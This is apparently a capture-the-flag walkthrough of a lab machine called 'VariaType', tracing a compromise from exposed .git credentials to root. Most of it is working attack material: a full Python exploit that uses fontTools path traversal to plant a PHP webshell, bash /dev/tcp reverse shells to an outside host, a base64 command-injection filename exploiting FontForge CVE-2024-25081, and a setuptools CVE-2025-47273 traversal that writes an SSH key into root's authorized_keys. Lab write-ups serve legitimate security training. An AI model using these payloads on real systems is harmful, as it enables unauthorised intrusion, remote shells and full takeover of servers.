## Reconnaissance

I started by scanning the target.


Result:
```
PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH  
80/tcp open  http    nginx
```
I added the discovered domains to `/etc/hosts`.

`echo "10.10.11.XX variatype.htb portal.variatype.htb" | sudo tee -a /etc/hosts`

Browsing to:
http://variatype.htb

I found a **Variable Font Generator** tool.

---
## Foothold – Git Exposure → Portal Access → Webshell

### Discovering the Exposed Git Repository

While enumerating the web server, I noticed the `.git` directory was accessible.

http://variatype.htb/.git/

This usually means the entire source code can be recovered. I dumped the repository locally.

```
git-dumper http://variatype.htb/.git repo  
cd repo
```

Then I inspected the commit history.

```
git log  
git show
```

One of the commits referenced a **gitbot user used for automated validation**, and in the history I found credentials used by the portal.

```bash
$USERS = [
    'gitbot' => 'G1tB0t_Acc3ss_2025!'
];
```

### Logging into the Portal

Using the credentials, I logged into:
http://portal.variatype.htb

The portal provides a **Variable Font Generator** where users can upload:
- `.designspace` files
- `.ttf` font masters

The backend uses **fontTools** to generate variable fonts.

### Exploiting the Font Generator

The `.designspace` configuration controls how fonts are generated and where the output file is written.

While reviewing how the generator works, I realized the output filename was not properly sanitized. This allowed **path traversal**, meaning I could control where the generated file would be saved.

My goal was to write a **PHP webshell** into the portal’s webroot.


```php
PHP = '<?php system($_GET["c"]); ?>'
```

This payload allows executing system commands via a GET parameter.

### Exploit Script

The following script generates malicious font files containing a PHP payload and uploads them to the vulnerable endpoint.

```python
#!/usr/bin/env python3  
"""VariaType HTB - Exploit"""  
  
import io, time, sys, re, requests  
from fontTools.fontBuilder import FontBuilder  
from fontTools.pens.ttGlyphPen import TTGlyphPen  
  
UPLOAD_URL = "http://variatype.htb/tools/variable-font-generator/process"  
SHELL_URL  = "http://portal.variatype.htb/shell.php"  
PHP        = '<?php system($_GET["c"]); ?>'  
TRAVERSAL  = "../../../var/www/portal.variatype.htb/public/shell.php"  
  
  
def build_ttf(weight: int) -> bytes:  
    fb = FontBuilder(unitsPerEm=1000, isTTF=True)  
    fb.setupGlyphOrder([".notdef"])  
    fb.setupCharacterMap({})  
    pen = TTGlyphPen(None)  
    pen.moveTo((0,0)); pen.lineTo((500,0))  
    pen.lineTo((500,500)); pen.lineTo((0,500))  
    pen.closePath()  
    fb.setupGlyf({".notdef": pen.glyph()})  
    fb.setupHorizontalMetrics({".notdef": (500,0)})  
    fb.setupHorizontalHeader(ascent=800, descent=-200)  
    fb.setupOS2(usWeightClass=weight)  
    fb.setupPost()  
    fb.setupNameTable({"familyName": PHP, "styleName": f"W{weight}"})  
    buf = io.BytesIO()  
    fb.font.save(buf)  
    return buf.getvalue()  
  
  
def make_designspace(traversal: str) -> str:  
    return f"""<?xml version='1.0' encoding='UTF-8'?>  
<designspace format="5.0">  
  <axes>  
    <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400"/>  
  </axes>  
  <sources>  
    <source filename="src-light.ttf" name="Light">  
      <location><dimension name="Weight" xvalue="100"/></location>  
    </source>  
    <source filename="src-regular.ttf" name="Regular">  
      <location><dimension name="Weight" xvalue="400"/></location>  
    </source>  
  </sources>  
  <variable-fonts>  
    <variable-font name="Font1" filename="output.ttf">  
      <axis-subsets><axis-subset name="Weight"/></axis-subsets>  
    </variable-font>  
    <variable-font name="Font2" filename="{traversal}">  
      <axis-subsets><axis-subset name="Weight"/></axis-subsets>  
    </variable-font>  
  </variable-fonts>  
</designspace>"""  
  
  
def upload(session, light, regular, traversal):  
    files = [  
        ("designspace", ("exploit.designspace", make_designspace(traversal).encode(), "application/xml")),  
        ("masters",     ("src-light.ttf",   light,   "font/ttf")),  
        ("masters",     ("src-regular.ttf", regular, "font/ttf")),  
    ]  
    r = session.post(UPLOAD_URL, files=files, timeout=30)  
    print(f"[*] HTTP {r.status_code}")  
    return r.status_code == 200  
  
  
def main():  
    print("[*] Building malicious fonts...")  
    light   = build_ttf(100)  
    regular = build_ttf(400)  
  
    session = requests.Session()  
  
    upload(session, light, regular, TRAVERSAL)  
  
if __name__ == "__main__":  
    main()

```

Run exploit:
`python3 exploit.py`

### Explanation

The payload was inserted into the **font name table**.
When the generator builds the output font, the payload becomes part of the generated file.
Next, I modified the `.designspace` file so that the generated font would be written directly into the web directory.
This traversal path forces the application to write the output file as:
/var/www/portal.variatype.htb/public/shell.php

The exploit uploads:
After the generator processes the files, the payload gets written to the portal webroot.

I then accessed the shell from the browser.
http://portal.variatype.htb/shell.php?c=id

Output confirmed command execution:

`uid=33(www-data) gid=33(www-data)`

At this point I had **initial access as `www-data`**.

### Reverse Shell

To get an interactive shell, I started a listener.
`nc -lvnp 4444`

Then executed a reverse shell through the webshell.
`bash -c 'bash -i >& /dev/tcp/10.10.14.243/4444 0>&1'`

This gave me a shell as:
www-data

---

## User Privilege Escalation (CVE-2024-25081)

During enumeration I found an interesting backup script.
`/opt/process_client_submissions.bak`

The script processes uploaded font files using **FontForge**.
`fontforge -lang=py -c "fontforge.open('$file')"`

The filename is directly passed into the command without sanitization, which makes it vulnerable to **CVE-2024-25081 (FontForge filename injection)**.

### Exploit

First I created a reverse shell payload and encoded it.

`echo 'bash -i >& /dev/tcp/10.10.14.243/5555 0>&1' | base64`
`YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yNDMvNTU1NSAwPiYxCg==`

Then I created a ZIP file containing a malicious filename.

```python
import zipfile  
  
payload = "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yNDMvNTU1NSAwPiYxCg== "  
fname = f"$(echo {payload}|base64 -d|bash).ttf"  
  
with zipfile.ZipFile("exploit.zip","w") as z:  
    z.writestr(fname,"dummy")
```

Listener:
`nc -lvnp 5555`

When the processing pipeline handled the file, the command executed and I received a shell as:

`steve`

User flag:
`cat /home/steve/user.txt`

---

## Root Privilege Escalation (CVE-2025-47273)

Checking sudo permissions:
`sudo -l`

Output:
`(root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *`

The script installs validator plugins from URLs using **setuptools**.

The installed version is vulnerable to **CVE-2025-47273**, which allows writing arbitrary files via URL-encoded path traversal.

---

### Exploit

First I generated an SSH keypair.
`ssh-keygen -t ed25519 -f /tmp/rootkey -N ""`

Then I prepared the payload.
`cp /tmp/rootkey.pub authorized_keys`

I hosted the key using a small HTTP server.

```python
from http.server import BaseHTTPRequestHandler, HTTPServer  
  
class Handler(BaseHTTPRequestHandler):  
    def do_GET(self):  
        self.send_response(200)  
        self.send_header("Content-type","text/plain")  
        self.end_headers()  
        with open("authorized_keys","rb") as f:  
            self.wfile.write(f.read())  
  
HTTPServer(("0.0.0.0",8888),Handler).serve_forever()
```

Then I triggered the vulnerable installer.

```bash
sudo /usr/bin/python3 /opt/font-tools/install_validator.py \  
http://10.10.14.243:8888/%2Froot%2F.ssh%2Fauthorized_keys
```

This wrote my SSH key directly into:
`/root/.ssh/authorized_keys`

### Root Access

I could now SSH as root.
`ssh -i /tmp/rootkey root@10.10.11.XX`

Finally I retrieved the root flag.
`cat /root/root.txt`

# Summary

|Step|Vulnerability|Impact|
|---|---|---|
|1|Exposed `.git` repository|Credentials discovered|
|2|fontTools path traversal|Webshell upload|
|3|CVE-2024-25081|Command injection → `steve`|
|4|CVE-2025-47273|Arbitrary file write|
|5|SSH key injection|Root shell|

---

```
Git Repository Exposure  
        ↓  
Credentials Found  
        ↓  
Portal Login  
        ↓  
Font Generator Exploit  
        ↓  
Webshell (www-data)  
        ↓  
FontForge Injection  
        ↓  
Shell as steve  
        ↓  
Setuptools Path Traversal  
        ↓  
Write /root/.ssh/authorized_keys  
        ↓  
SSH Root Access  
        ↓  
Flags Captured
```
